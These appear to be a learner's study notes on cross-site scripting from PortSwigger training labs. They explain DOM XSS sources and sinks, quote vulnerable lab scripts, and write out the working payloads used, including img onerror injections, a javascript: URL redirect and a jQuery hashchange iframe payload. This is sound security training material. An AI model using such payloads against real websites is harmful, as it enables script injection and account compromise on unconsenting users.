https://cwe.mitre.org/data/definitions/79.html
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://owasp.org/www-community/attacks/xss/

So, it's better to use `print()` instead of `alert()` due to some recent updates.

https://encyclopedia.kaspersky.com/glossary/dangling-markup/



⭐️ https://pwn.college/content-injection~24cec712/html-js
https://www.intigriti.com/researchers/hackademy/cross-site-scripting-xss/how-to-test-for-cross-site-scripting

https://portswigger.net/academy/labs/launch/09e0bee59e32e92a78e614589793110f95c397459ed0ab96a3dbaf100e3b7cde?referrer=%2fweb-security%2fcross-site-scripting%2fstored%2flab-html-context-nothing-encoded


---

## Lab DOM XSS

he lab title is "DOM XSS in `document.write` sink using source `location.search`."

Here is the translation:

- **DOM XSS:** The vulnerability is happening entirely in your browser (the client). The server sends the page, and your browser executes some JavaScript that messes up.
    
- **Source (`location.search`):** This is where the untrusted input comes from. `location.search` is JavaScript-speak for "everything in the URL after the `?`".
    
    - _Example:_ In `website.com/?search=ippsec`, `location.search` is `?search=ippsec`.
        
- **Sink (`document.write`):** This is where the dangerous action happens. `document.write` is a function that literally writes HTML code onto the page while it's loading.

=> So, all I had to do was just insert xss code on the sink that would be rendered by the source in this case the function

```
<script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+some XSS query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
```

---

## Lab

```
<script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
</script>
                            
```

This was similar as we had to escape two tags `<option> `and `<select>` and then put on alert() to solve the lab
and yeah we have to use `&` on the GET parameter to achieve this so mine was
`GET /product?productId=1&storeId="></option></select><img src=1 onerror=alert(1)> HTTP/2`

---

Always look at the **Source** of the data in the JavaScript.

- If it says `location.hash` -> Attack the `#` part of the URL.
    
- If it says `location.search` -> Attack the `?` parameters (GET).
    
- If it says `document.referrer` -> Attack the HTTP Referer header.

---

## Lab

```
 <script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
</script>
```

this needs side effect instead of running alert() directly or something
We use onload or onerror attribs
so I used this `<img src=1 onerror=alert(1)>`

---

## Lab jQuery

This was also easy as the payload was already provided in the notes section i.e. `javascript:alert(document.domain)`
then all I did was a GET to make it run javascript
```
GET /feedback?returnPath=javascript:alert(document.domain) HTTP/2
Host: 0a49009c03655b1c805f035e009f0061.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="143", "Not=A?Brand";v="8", "Chromium";v="143"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br

```

---

Another potential sink to look out for is jQuery's `$()` selector function, which can be used to inject malicious objects into the DOM.

Dated vulnerability
`$(window).on('hashchange', function() { var element = $(location.hash); element[0].scrollIntoView(); });`
and we can use this as the payload to invoke XSS
`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
